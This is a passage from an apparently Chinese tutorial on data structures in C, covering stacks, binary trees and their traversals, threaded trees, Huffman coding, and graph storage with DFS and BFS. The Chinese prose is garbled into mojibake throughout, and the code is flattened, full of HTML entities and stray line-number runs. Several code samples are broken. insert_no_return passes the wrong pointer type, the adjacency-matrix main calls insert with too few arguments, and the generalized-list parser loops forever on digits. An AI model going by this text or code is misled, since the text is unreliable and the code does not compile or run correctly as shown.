!s-&gt;head-&gt;next) return ERROR; Node_p tmp = s-&gt;head-&gt;next; s-&gt;head-&gt;next = s-&gt;head-&gt;next-&gt;next; freeNode(tmp); s-&gt;len--; return OK;&#125;int top(Stack_p s) &#123; if (!s || !s-&gt;head || !s-&gt;head-&gt;next) return ERROR; return s-&gt;head-&gt;next-&gt;val;&#125;int empty(Stack_p s) &#123; return (!s || !s-&gt;head || !s-&gt;head-&gt;next);&#125;void freeStack(Stack_p s) &#123; if (!s || !s-&gt;head) return; Node *p = s-&gt;head, *tmp; while (p) &#123; tmp = p; p = p-&gt;next; freeNode(tmp); &#125; free(s);&#125;void showStack(Stack_p s) &#123; if (!s || !s-&gt;head) return; Node_p p = s-&gt;head-&gt;next; while (p) &#123; (p != s-&gt;head-&gt;next) &amp;&amp; printf(\" \"); printf(\"%d\", p-&gt;val); p = p-&gt;next; &#125; printf(\"\\n\");&#125;int main() &#123; srand(time(NULL)); Stack_p s = initStack(); int cnt = 20; while (cnt--) &#123; int val = rand() % 100; int opt = rand() % 4; switch (opt) &#123; case 0: case 1: case 2: printf(\"push %d, %s\\n\", val, push(s, val) ? \"SUC\": \"ERROR\"); showStack(s); break; case 3: empty(s) ? printf(\"Nothing to pop.\\n\") : printf(\"Pop.\\n\"); pop(s); showStack(s); break; &#125; &#125; printf(\"\\nFinal: \\n\"); showStack(s); return 0;&#125; æ ‘ å®šä¹‰ åŸºæœ¬æ¦‚å¿µ åˆ†æ”¯åº¦ï¼šèŠ‚ç‚¹æ‹¥æœ‰çš„å­èŠ‚ç‚¹ä¸ªæ•°ã€‚ é˜¶å±‚ï¼šä»æ ¹èŠ‚ç‚¹å±‚å¾€ä¸‹ï¼Œé˜¶å±‚ä» 1 å¾€ä¸‹ä¾æ¬¡å¢åŠ ã€‚ é«˜åº¦ï¼ˆæ·±åº¦ï¼‰ï¼šæ ‘çš„æœ€å¤§é˜¶å±‚å€¼ã€‚â¾¼åº¦å’Œæ·±åº¦æ˜¯ç›¸åçš„ï¼Œ â¾¼åº¦æ˜¯ä»ä¸‹å¾€ä¸Šæ•°ï¼Œ æ·±åº¦æ˜¯ä»ä¸Šå¾€ ä¸‹ã€‚ å› æ­¤æ ¹èŠ‚ç‚¹çš„æ·±åº¦å’Œå¶â¼¦èŠ‚ç‚¹çš„â¾¼åº¦æ˜¯ 1ã€‚ ç¥–å…ˆï¼šæŸèŠ‚ç‚¹åˆ°æ ¹èŠ‚ç‚¹çš„è·¯å¾„ä¸Šæ‰€æœ‰èŠ‚ç‚¹éƒ½æ˜¯è¯¥èŠ‚ç‚¹ç¥–å…ˆã€‚ æ ‘æ—ï¼šå¤šä¸ªæ•°çš„é›†åˆã€‚ æ­ªæ–œæ ‘ï¼šæ‰€æœ‰èŠ‚ç‚¹åªæœ‰å·¦å­©å­ï¼Œå·¦æ­ªæ–œæ ‘ã€‚å³æ­ªæ–œæ ‘åŒç†ã€‚ æ»¡äºŒå‰æ ‘ ä¸€ä¸ªäºŒå‰æ ‘ï¼Œå¦‚æœæ¯ä¸€ä¸ªå±‚çš„ç»“ç‚¹æ•°éƒ½è¾¾åˆ°æœ€å¤§å€¼ï¼Œåˆ™è¿™ä¸ªäºŒå‰æ ‘å°±æ˜¯æ»¡äºŒå‰æ ‘ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸€ä¸ªäºŒå‰æ ‘çš„å±‚æ•°ä¸º kï¼Œä¸”ç»“ç‚¹æ€»æ•°æ˜¯\\(2^k -1\\) ï¼Œåˆ™å®ƒå°±æ˜¯æ»¡äºŒå‰æ ‘ã€‚ å®Œå…¨äºŒå‰æ ‘ ä¸€æ£µæ·±åº¦ä¸ºkçš„æœ‰nä¸ªç»“ç‚¹çš„äºŒå‰æ ‘ï¼Œå¯¹æ ‘ä¸­çš„ç»“ç‚¹æŒ‰ä»ä¸Šè‡³ä¸‹ã€ä»å·¦åˆ°å³çš„é¡ºåºè¿›è¡Œç¼–å·ï¼Œå¦‚æœç¼–å·ä¸ºiï¼ˆ1â‰¤iâ‰¤nï¼‰çš„ç»“ç‚¹ä¸æ»¡äºŒå‰æ ‘ä¸­ç¼–å·ä¸ºiçš„ç»“ç‚¹åœ¨äºŒå‰æ ‘ä¸­çš„ä½ç½®ç›¸åŒï¼Œåˆ™è¿™æ£µäºŒå‰æ ‘ç§°ä¸ºå®Œå…¨äºŒå‰æ ‘ã€‚ æ€§è´¨ äºŒå‰æ ‘ç¬¬ i å±‚å¯¹å¤š \\(2^{i-1}\\) ä¸ªèŠ‚ç‚¹ã€‚ å±‚æ•°ä¸º k çš„æ»¡äºŒå‰æ ‘èŠ‚ç‚¹æ•°ä¸º \\(2^k -1\\)ã€‚ äºŒå‰æ ‘ä¸­ï¼Œç»ˆç«¯èŠ‚ç‚¹ä¸ªæ•°ï¼Œç­‰äºåº¦æ•°ä¸º 2 çš„èŠ‚ç‚¹ä¸ªæ•° + 1ã€‚ éå† å…ˆåºéå†æ—¶ï¼Œéå†çš„é¡ºåºæ˜¯ä»æ ¹ç»“ç‚¹å¼€å§‹ï¼Œå…ˆè®¿é—®å½“å‰ç»“ç‚¹ï¼Œå¦‚æœå·¦å­æ ‘ä¸ä¸ºç©ºåˆ™ç»§ç»­è®¿é—®å·¦å­æ ‘ï¼Œä¹‹åè‹¥å³å­æ ‘ä¸ä¸ºç©ºå†è®¿é—®å³å­æ ‘ã€‚åœ¨å·¦å³å­æ ‘ä¸­ä¾ç„¶æŒ‰ç…§è¿™æ ·çš„é¡ºåºè¿›è¡Œéå†ã€‚ ä¸­åºéå†çš„é¡ºåºæ˜¯ä»å½“å‰ç»“ç‚¹çš„å·¦å­æ ‘å¼€å§‹éå†ï¼Œå†è®¿é—®å½“å‰ç»“ç‚¹ï¼Œæœ€åè®¿é—®å³å­æ ‘ã€‚ ååºéå†å…ˆè®¿é—®å½“å‰ç»“ç‚¹çš„å·¦å­æ ‘ï¼Œå†è®¿é—®å³å­æ ‘ï¼Œæœ€åè®¿é—®å½“å‰ç»“ç‚¹ã€‚ ç®€å•å®ç° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct Node &#123; int data; struct Node *lchild, *rchild;&#125; Node;typedef struct Tree &#123; int len; Node *root;&#125; Tree;Node* init(int data) &#123; Node *node =(Node *)malloc(sizeof(Node)); node-&gt;data = data; node-&gt;lchild = NULL; node-&gt;rchild = NULL; return node;&#125;// ä¿æŒäºŒå‰æœç´¢æ ‘ç»“æ„ï¼Œæ’å…¥å€¼Node *insert(Node *root, int val) &#123; if (!root) &#123; Node *n = init(val); return n; &#125; if (root-&gt;data &lt; val) &#123; root-&gt;rchild = insert(root-&gt;rchild, val); &#125; else &#123; root-&gt;lchild = insert(root-&gt;lchild, val); &#125; return root;&#125;// ä¿æŒäºŒå‰æœç´¢æ ‘ç»“æ„ï¼Œæ’å…¥å€¼. ä¸è¿”å›æŒ‡é’ˆï¼Œç›´æ¥åœ¨åŸåœ°å€ä¸­æ“ä½œã€‚void insert_no_return(Node **raddr, int val) &#123; if (!(*raddr)) &#123; *raddr = init(val); return; &#125; if ((*raddr)-&gt;data &lt; val) &#123; (*raddr)-&gt;rchild = insert(&amp;((*raddr)-&gt;rchild), val); &#125; else &#123; (*raddr)-&gt;lchild = insert(&amp;((*raddr)-&gt;lchild), val); &#125; return;&#125;void insert_tree(Tree *t, int val) &#123; if (!t) return; t-&gt;root = insert(t-&gt;root, val); t-&gt;len++;&#125;Node* build_demo() &#123; Node *node = init(1); node-&gt;lchild = init(2); node-&gt;rchild = init(3); node-&gt;lchild-&gt;lchild = init(4); node-&gt;lchild-&gt;rchild = init(5); node-&gt;rchild-&gt;rchild = init(6); return node;&#125;void preorder(Node *node) &#123; printf(\"%d \", node-&gt;data); if (node-&gt;lchild != NULL) &#123; preorder(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; preorder(node-&gt;rchild); &#125;&#125;void inorder(Node *node) &#123; if (node-&gt;lchild != NULL) &#123; inorder(node-&gt;lchild); &#125; printf(\"%d \", node-&gt;data); if (node-&gt;rchild != NULL) &#123; inorder(node-&gt;rchild); &#125;&#125;void postorder(Node *node) &#123; if (node-&gt;lchild != NULL) &#123; postorder(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; postorder(node-&gt;rchild); &#125; printf(\"%d \", node-&gt;data);&#125;void clear(Node *node) &#123; if (node-&gt;lchild != NULL) &#123; clear(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; clear(node-&gt;rchild); &#125; free(node);&#125;void clear_tree(Tree *t) &#123; if (t-&gt;root) clear(t-&gt;root); free(t); return;&#125; å·²çŸ¥å…ˆåºå’Œä¸­åºæ±‚ååºéå† 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef struct Node &#123; int data; struct Node *lchild, *rchild;&#125; Node;Node* init(int data) &#123; Node *node =(Node *)malloc(sizeof(Node)); node-&gt;data = data; node-&gt;lchild = NULL; node-&gt;rchild = NULL; return node;&#125;void postorder(Node *node) &#123; if (node-&gt;lchild != NULL) &#123; postorder(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; postorder(node-&gt;rchild); &#125; printf(\"%d \", node-&gt;data);&#125;// æ ¹æ®å…ˆåºå’Œä¸­åºå»ºç«‹äºŒå‰æ ‘çš„å‡½æ•° buildNode *build(char pre_str[], char in_str[], int len) &#123; Node *p = init(pre_str[0] - '0'); int pos = strchr(in_str, pre_str[0]) - in_str; if (pos &gt; 0) &#123; p-&gt;lchild = build(pre_str + 1, in_str, pos); &#125; if (len - pos - 1 &gt; 0) &#123; p-&gt;rchild = build(pre_str + pos + 1, in_str + pos + 1, len - pos - 1); &#125; return p;&#125;void clear(Node *node) &#123; if (node-&gt;lchild != NULL) &#123; clear(node-&gt;lchild); &#125; if (node-&gt;rchild != NULL) &#123; clear(node-&gt;rchild); &#125; free(node);&#125;int main() &#123; char pre_str[] = \"136945827\"; char in_str[] = \"963548127\"; Node *root = build(pre_str, in_str, strlen(pre_str)); postorder(root); printf(\"\\n\"); clear(root); return 0;&#125; Huffmanç¼–ç  1952 å¹´ç”± David A. Huffman æå‡ºçš„ä¸€ç§æ— æŸæ•°æ®å‹ç¼©çš„ç¼–ç ç®—æ³•ã€‚ å“ˆå¤«æ›¼ç¼–ç å…ˆç»Ÿè®¡å‡ºæ¯ç§å­—æ¯åœ¨å­—ç¬¦ä¸²é‡Œå‡ºç°çš„é¢‘ç‡ï¼Œæ ¹æ®é¢‘ç‡å»ºç«‹ä¸€æ£µè·¯å¾„å¸¦æƒçš„äºŒå‰æ ‘ï¼Œä¹Ÿå°±æ˜¯å“ˆå¤«æ›¼æ ‘ã€‚ æ ‘ä¸Šæ¯ä¸ªç»“ç‚¹å­˜å‚¨å­—æ¯å‡ºç°çš„é¢‘ç‡ï¼Œæ ¹ç»“ç‚¹åˆ°ç»“ç‚¹çš„è·¯å¾„å³æ˜¯å­—æ¯çš„ç¼–ç ï¼Œé¢‘ç‡é«˜çš„å­—æ¯ä½¿ç”¨è¾ƒçŸ­çš„ç¼–ç ï¼Œé¢‘ç‡ä½çš„å­—æ¯ä½¿ç”¨è¾ƒé•¿çš„ç¼–ç ï¼Œè¿™æ ·ä½¿å¾—ç¼–ç åçš„å­—ç¬¦ä¸²å ç”¨ç©ºé—´æœ€å°ã€‚ å®ç°æ–¹æ³• é¦–å…ˆç»Ÿè®¡æ¯ä¸ªå­—æ¯åœ¨å­—ç¬¦ä¸²é‡Œå‡ºç°çš„é¢‘ç‡ï¼ŒæŠŠæ¯ä¸ªå­—æ¯çœ‹æˆä¸€ä¸ªç»“ç‚¹ï¼Œç»“ç‚¹çš„æƒå€¼å³æ˜¯å­—æ¯å‡ºç°çš„é¢‘ç‡ã€‚ æŠŠæ¯ä¸ªç»“ç‚¹çœ‹æˆä¸€æ£µåªæœ‰æ ¹ç»“ç‚¹çš„äºŒå‰æ ‘ï¼Œä¸€å¼€å§‹æŠŠæ‰€æœ‰äºŒå‰æ ‘ï¼ˆç»“ç‚¹ï¼‰éƒ½æ”¾åœ¨ä¸€ä¸ªé›†åˆé‡Œï¼Œæ¥ä¸‹æ¥å¼€å§‹å¦‚ä¸‹ç¼–ç ï¼š æ­¥éª¤ä¸€ï¼šä»é›†åˆé‡Œå–å‡ºä¸¤ä¸ªæ ¹ç»“ç‚¹æƒå€¼æœ€å°çš„æ ‘aå’Œbï¼Œæ„é€ å‡ºä¸€æ£µæ–°çš„äºŒå‰æ ‘cï¼ŒäºŒå‰æ ‘cçš„æ ¹ç»“ç‚¹çš„æƒå€¼ä¸ºaå’Œbçš„æ ¹ç»“ç‚¹æƒå€¼å’Œï¼ŒäºŒå‰æ ‘cçš„å·¦å³å­æ ‘åˆ†åˆ«æ˜¯aå’Œbã€‚ï¼ˆåˆå¹¶ï¼‰ æ­¥éª¤äºŒï¼šå°†äºŒå‰æ ‘aå’Œbä»é›†åˆé‡Œåˆ é™¤ï¼ŒæŠŠäºŒå‰æ ‘cåŠ å…¥é›†åˆé‡Œã€‚ï¼ˆæ›´æ–°å€™é€‰ï¼‰ é‡å¤ä»¥ä¸Šä¸¤ä¸ªæ­¥éª¤ï¼Œç›´åˆ°é›†åˆé‡Œåªå‰©ä¸‹ä¸€æ£µäºŒå‰æ ‘ï¼Œæœ€åå‰©ä¸‹çš„å°±æ˜¯å“ˆå¤«æ›¼æ ‘äº†ã€‚ è§„å®šæ¯ä¸ªæœ‰å­©å­çš„ç»“ç‚¹ï¼Œåˆ°å·¦å­©å­çš„è·¯å¾„ä¸º 0ï¼Œåˆ°å³å­©å­çš„è·¯å¾„ä¸º 1ã€‚æ¯ä¸ªå­—æ¯çš„ç¼–ç å°±æ˜¯æ ¹ç»“ç‚¹åˆ°å­—æ¯å¯¹åº”ç»“ç‚¹çš„è·¯å¾„ã€‚ å¹¿ä¹‰è¡¨ ç¤ºä¾‹ï¼š å¹¿ä¹‰è¡¨ä¸ºï¼š(5 ( 3 ( 1, 4 ), 6 (, 8 ( 7, ) ) ) ) å®ç°æ ¹æ®å¹¿ä¹‰è¡¨è¾“å…¥ï¼Œæ„å»ºæ ‘ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576...// ä¸Šæ¥æ ‘çš„å®ç° #include &lt;string.h&gt;// æ ˆå¤„ç†å¹¿ä¹‰è¡¨typedef struct Stack &#123; Node **elements; int max_size, top_index;&#125; Stack;Stack *init_stack(int length) &#123; Stack *s = (Stack *)malloc(sizeof(Stack)); s-&gt;elements = (Node **)malloc(sizeof(Node *) * length); s-&gt;max_size = length; s-&gt;top_index = -1; return s;&#125;void freeStack(Stack *s) &#123; if (!s) return; free(s-&gt;elements); free(s);&#125;int push(Stack *s, Node *n) &#123; if (!s) return 0; if (s-&gt;top_index == s-&gt;max_size - 1) return 0; s-&gt;elements[++s-&gt;top_index] = n; return 1;&#125;int is_empty(Stack *s) &#123; return !(s &amp;&amp; s-&gt;top_index != -1);&#125;Node *pop(Stack *s) &#123; return s-&gt;elements[s-&gt;top_index--];&#125;Node *build_tree(char *str) &#123; Stack *s = init_stack(100); Node *root, *n; int flag = 0; while(str[0]) &#123; switch (str[0]) &#123; case '(': push(s, n); flag = 0; break; case ',': flag = 1; break; case ')': root = pop(s); break; default: if (str[0] &lt; '0' || str[0] &gt; '9') break; int num = 0; while (str[0] &gt;= '0' &amp;&amp; str[0] &lt;= '9') &#123; num = num * 10 + (str[0] - '0'); &#125; str--; n = init(num); if (!is_empty(s)) flag ? (s-&gt;elements[s-&gt;top_index]-&gt;rchild = n) : \\ (s-&gt;elements[s-&gt;top_index]-&gt;lchild = n); &#125; ++str; &#125; freeStack(s); return root;&#125; çº¿ç´¢äºŒå‰æ ‘ åˆ©ç”¨å¶å­èŠ‚ç‚¹çš„ç©ºæŒ‡é’ˆï¼Œå»ºç«‹æ‰€éœ€è¦çš„å‰é©±åç»§ç»“æ„ã€‚æ¯”å¦‚ä¸‹é¢å®ç°ä¸­åºéå†çš„å‰é©±åç»§ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;time.h&gt;// ltag å’Œ rtag è¡¨ç¤ºèŠ‚ç‚¹çš„å·¦å³å­©å­æ˜¯æ™®é€šå­©å­èŠ‚ç‚¹è¿˜æ˜¯å‰é©±åç»§èŠ‚ç‚¹ã€‚// å‰é©±åç»§èŠ‚ç‚¹ï¼Œå°†å¶å­èŠ‚ç‚¹çš„ç©ºæŒ‡é’ˆå­©å­æŒ‡å‘ä¸­åºéå†çš„å‰é©±åç»§èŠ‚ç‚¹ã€‚enum &#123; CHILD = 0, THREAD = 1&#125;;typedef struct Node &#123; int val; struct Node *lchild; struct Node *rchild; int rtag, ltag;&#125; Node;Node *initNode(int val) &#123; Node *n = (Node *)malloc(sizeof(Node)); n-&gt;val = val; n-&gt;lchild = NULL; n-&gt;rchild = NULL; n-&gt;ltag = CHILD; n-&gt;rtag = CHILD; return n;&#125;void freeNode(Node *n) &#123; if (!n) return; free(n); return;&#125;Node *insert(Node *root, int val) &#123; if (!root) return initNode(val); if (val &gt; root-&gt;val) root-&gt;rchild = insert(root-&gt;rchild, val); else root-&gt;lchild = insert(root-&gt;lchild, val); return root;&#125;void freeTree(Node *root) &#123; if (!root) return; if (root-&gt;rtag == CHILD) freeTree(root-&gt;rchild); if (root-&gt;ltag == CHILD) freeTree(root-&gt;lchild); freeNode(root); return;&#125;void inorder(Node *root) &#123; if (!root) return; if (root-&gt;ltag == CHILD) inorder(root-&gt;lchild); if (root-&gt;rtag == CHILD) printf(\"%d \", root-&gt;val); inorder(root-&gt;rchild); return;&#125;// çº¿ç´¢äºŒå‰æ ‘Node *pre = NULL;// ç±»ä¼¼inordoerçš„éå†æ–¹æ³•ï¼ŒåŒæ—¶æ›´æ–°å¶å­èŠ‚ç‚¹çš„å‰é©±å’Œåç»§void build_thread_tree(Node *root) &#123; if (!root) return; build_thread_tree(root-&gt;lchild); // æ›´æ–°å½“å‰èŠ‚ç‚¹ï¼ˆå¶å­èŠ‚ç‚¹ï¼‰çš„å‰é©±ï¼ŒåŠå‰é©±èŠ‚ç‚¹çš„åç»§ã€‚ if (root-&gt;lchild == NULL) &#123; root-&gt;lchild = pre; root-&gt;ltag = THREAD; &#125; if (pre &amp;&amp; !pre-&gt;rchild) &#123; pre-&gt;rchild = root; pre-&gt;rtag = THREAD; &#125; pre = root; build_thread_tree(root-&gt;rchild);&#125;Node *getLeftMost(Node *n) &#123; while (n &amp;&amp; n-&gt;ltag == CHILD &amp;&amp; n-&gt;lchild) n = n-&gt;lchild; return n;&#125;void output(Node *root) &#123; if (!root) return; Node *n = getLeftMost(root); while (n) &#123; printf(\"%d \", n-&gt;val); if (n-&gt;rtag == CHILD) n = getLeftMost(n-&gt;rchild); // éå¶å­èŠ‚ç‚¹ï¼Œç¬¦åˆä¸­åºéå† else n = n-&gt;rchild; // åç»§ &#125;&#125;int main() &#123; srand(time(NULL)); Node *root = NULL; int cnt = 10; printf(\"Input : \"); while (cnt--) &#123; int val = rand() % 100; printf(\"%d \", val); root = insert(root, val); &#125; printf(\"\\n\"); printf(\"Inorder output: \"); inorder(root); printf(\"\\n\"); printf(\"Thread output : \"); build_thread_tree(root); output(root); printf(\"\\n\"); freeTree(root); return 0;&#125; å›¾ ä¸€ä¸ªå›¾æœ‰å¾ˆå°‘è¾¹ï¼ˆå¦‚ \\(e &lt; n\\log (n)\\)ï¼Œe æŒ‡è¾¹æ•°ï¼Œn æŒ‡ç‚¹æ•°ï¼‰çš„å›¾ç§°ä¸ºç¨€ç–å›¾ï¼Œåä¹‹ç§°ä¸ºç¨ å¯†å›¾ã€‚ é¡¶ç‚¹çš„ åº¦ æ˜¯æŒ‡ä¾é™„äºæŸä¸ªé¡¶ç‚¹çš„è¾¹æ•°ã€‚ å…¥åº¦ æ˜¯ä»¥è¯¥é¡¶ç‚¹ä¸ºç»ˆç‚¹çš„å¼§çš„æ•°ç›®ï¼Œå‡ºåº¦ æ˜¯ä»¥è¯¥é¡¶ç‚¹ä¸ºèµ·ç‚¹çš„å¼§çš„æ•°ç›®ã€‚ ç¨€ç–å›¾ï¼Œä¸€èˆ¬ç”¨é‚»æ¥è¡¨æ¥å­˜å‚¨ï¼Œè¿™æ ·å¯ä»¥èŠ‚çœç©ºé—´ï¼›å¦‚æœæ˜¯ç¨ å¯†å›¾ï¼Œä¸€èˆ¬ç”¨é‚»æ¥çŸ©é˜µæ¥å­˜å‚¨ã€‚ é‚»æ¥çŸ©é˜µ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define MAX_N 500typedef struct Graph &#123; int mat[MAX_N][MAX_N]; int n;&#125; Graph;void init(Graph *g, int n) &#123; g-&gt;n = n; memset(g-&gt;mat, 0, sizeof(g-&gt;mat));&#125;void insert(Graph *g, int a, int x, int y) &#123; if (x &lt; 0 || x &gt;= g-&gt;n || y &lt; 0 || y &gt;= g-&gt;n) &#123; return ; &#125; if (a) &#123; g-&gt;mat[x][y] = 1; g-&gt;mat[y][x] = 1; &#125; else &#123; g-&gt;mat[x][y] = 1; &#125;&#125;void output(Graph *g) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; for (int j = 0; j &lt; g-&gt;n; ++j) &#123; (j) &amp;&amp; printf(\" \"); printf(\"%d\", g-&gt;mat[i][j]); &#125; (i &lt; g-&gt;n - 1) &amp;&amp; printf(\"\\n\"); &#125;&#125;int main() &#123; int n, m, x, y; scanf(\"%d %d\", &amp;n, &amp;m); Graph *graph = (Graph *)malloc(sizeof(Graph)); init(graph, n); for (int i = 0; i &lt; m; ++i) &#123; scanf(\"%d %d\", &amp;x, &amp;y); insert(graph, x, y); &#125; output(graph); free(graph); return 0;&#125; é‚»æ¥è¡¨ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define MAX_N 10000typedef struct Node &#123; int vertex; struct Node *next;&#125; Node, *LinkedList;LinkedList insert_node(LinkedList head, int index) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;vertex = index; node-&gt;next = head; head = node; return head;&#125;typedef struct Graph &#123; int n; LinkedList edges[MAX_N];&#125; Graph;void init(Graph *g, int n) &#123; g-&gt;n = n; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; g-&gt;edges[i] = NULL; &#125;&#125;void insert(Graph *g, int a, int x, int y) &#123; if (x &lt; 0 || x &gt;= g-&gt;n || y &lt; 0 || y &gt;= g-&gt;n) &#123; return ; &#125; if (a) &#123; g-&gt;edges[x] = insert_node(g-&gt;edges[x], y); g-&gt;edges[y] = insert_node(g-&gt;edges[y], x); &#125; else &#123; g-&gt;edges[x] = insert_node(g-&gt;edges[x], y); &#125;&#125;void output(Graph *g) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; printf(\"%d:\", i); for (Node *j = g-&gt;edges[i]; j != NULL; j = j-&gt;next) &#123; printf(\" %d\", j-&gt;vertex); &#125; (i &lt; g-&gt;n - 1) &amp;&amp; printf(\"\\n\"); &#125;&#125;void clear(Graph *g) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; Node *head = g-&gt;edges[i]; while (head != NULL) &#123; Node *delete_node = head; head = head-&gt;next; free(delete_node); &#125; &#125; free(g);&#125;int main() &#123; int n, m, a, x, y; scanf(\"%d %d\", &amp;n, &amp;m); Graph *graph = (Graph *)malloc(sizeof(Graph)); init(graph, n); for (int i = 0; i &lt; m; ++i) &#123; scanf(\"%d %d %d\", &amp;a, &amp;x, &amp;y); insert(graph, a, x, y); &#125; output(graph); clear(graph); return 0;&#125; å›¾æœç´¢ æ·±åº¦ä¼˜å…ˆ ä»å¼€å§‹èŠ‚ç‚¹ï¼Œéå†ç›¸é‚»èŠ‚ç‚¹ï¼Œè‹¥è¯¥èŠ‚ç‚¹æ²¡æœ‰è¢«è®¿é—®è¿‡ï¼Œé€’å½’éå†å…¶ç›¸é‚»èŠ‚ç‚¹ã€‚é‡åˆ°æ²¡æœ‰éå†çš„ï¼Œå°±å‘ä¸‹é€’å½’ã€‚ åˆ©ç”¨é‚»æ¥è¡¨å®ç°DFS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define MAX_N 10000typedef struct Node &#123; int vertex; struct Node *next;&#125;Node, *LinkedList;LinkedList insert_node(LinkedList head, int index) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;vertex = index; node-&gt;next = head; head = node; return head;&#125;typedef struct Graph &#123; LinkedList edges[MAX_N]; int n; int visited[MAX_N];&#125;Graph;void init(Graph *g, int n) &#123; g-&gt;n = n; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; g-&gt;edges[i] = NULL; &#125; memset(g-&gt;visited, 0, sizeof(g-&gt;visited));&#125;void insert(Graph *g, int x, int y) &#123; if (x &lt; 0 || x &gt;= g-&gt;n || y &lt; 0 || y &gt;= g-&gt;n) &#123; return ; &#125; g-&gt;edges[x] = insert_node(g-&gt;edges[x], y); g-&gt;edges[y] = insert_node(g-&gt;edges[y], x);&#125;void clear(Graph *g) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; Node *head = g-&gt;edges[i]; while (head != NULL) &#123; Node *delete_node = head; head = head-&gt;next; free(delete_node); &#125; &#125; free(g);&#125;void dfs(Graph *g, int vertex) &#123; printf(\"%d\\n\", vertex); g-&gt;visited[vertex] = 1; for (Node *adj = g-&gt;edges[vertex]; adj != NULL; adj = adj-&gt;next) &#123; if (!g-&gt;visited[adj-&gt;vertex]) &#123; dfs(g, adj-&gt;vertex); &#125; &#125;&#125;int main() &#123; int n, m, k; scanf(\"%d %d\", &amp;n, &amp;m); Graph *graph = (Graph *)malloc(sizeof(Graph)); init(graph, n); for (int i = 0; i &lt; m; ++i) &#123; int x, y; scanf(\"%d %d\", &amp;x, &amp;y); insert(graph, x, y); &#125; scanf(\"%d\", &amp;k); dfs(graph, k); clear(graph); return 0;&#125; å¹¿åº¦ä¼˜å…ˆ å…ˆéå†å®Œä¸€ä¸ªèŠ‚ç‚¹çš„æ‰€æœ‰ç›¸é‚»èŠ‚ç‚¹ï¼Œå†éå†ç›¸é‚»èŠ‚ç‚¹çš„ç›¸é‚»èŠ‚ç‚¹ã€‚ ä½¿ç”¨ queue å®ç°å¹¿åº¦ä¼˜å…ˆæœç´¢ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define MAX_N 10000typedef struct Queue &#123; int *data; int head, tail, length;&#125; Queue;void init_queue(Queue *q, int length_input) &#123; q-&gt;data = (int *)malloc(sizeof(int) * length_input); q-&gt;length = length_input; q-&gt;head = 0; q-&gt;tail = -1;&#125;void push(Queue *q, int element) &#123; if (q-&gt;tail + 1 &lt; q-&gt;length) &#123; q-&gt;tail++; q-&gt;data[q-&gt;tail] = element; &#125;&#125;int front(Queue *q) &#123; return q-&gt;data[q-&gt;head];&#125;void pop(Queue *q) &#123; q-&gt;head++;&#125;int empty(Queue *q) &#123; if (q-&gt;head &gt; q-&gt;tail) &#123; return 1; &#125; else &#123; return 0; &#125;&#125;void clear_queue(Queue *q) &#123; free(q-&gt;data); free(q);&#125;typedef struct Node &#123; int vertex; struct Node *next;&#125;Node, *LinkedList;LinkedList insert_node(LinkedList head, int index) &#123; Node *node = (Node *)malloc(sizeof(Node)); node-&gt;vertex = index; node-&gt;next = head; head = node; return head;&#125;typedef struct Graph &#123; LinkedList edges[MAX_N]; int visited[MAX_N]; int n;&#125;Graph;void init_graph(Graph *g, int n) &#123; g-&gt;n = n; memset(g-&gt;visited, 0, sizeof(g-&gt;visited)); for (int i = 0; i &lt; g-&gt;n; ++i) &#123; g-&gt;edges[i] = NULL; &#125;&#125;void insert(Graph *g, int x, int y) &#123; if (x &lt; 0 || x &gt;= g-&gt;n || y &lt; 0 || y &gt;= g-&gt;n) &#123; return ; &#125; g-&gt;edges[x] = insert_node(g-&gt;edges[x], y); g-&gt;edges[y] = insert_node(g-&gt;edges[y], x);&#125;void clear_graph(Graph *g) &#123; for (int i = 0; i &lt; g-&gt;n; ++i) &#123; Node *head = g-&gt;edges[i]; while (head != NULL) &#123; Node *delete_node = head; head = head-&gt;next; free(delete_node); &#125; &#125; free(g);&#125;void bfs(Graph *g, int start_vertex) &#123; Queue *queue = (Queue *)malloc(sizeof(Queue)); init_queue(queue, g-&gt;n); push(queue, start_vertex); g-&gt;visited[start_vertex] = 1; while (!empty(queue)) &#123; int vertex = front(queue); printf(\"%d\\n\", vertex); pop(queue); for (Node *adj = g-&gt;edges[vertex]; adj != NULL; adj = adj-&gt;next) &#123; if (!g-&gt;visited[adj-&gt;vertex]) &#123; g-&gt;visited[adj-&gt;vertex] = 1; push(queue, 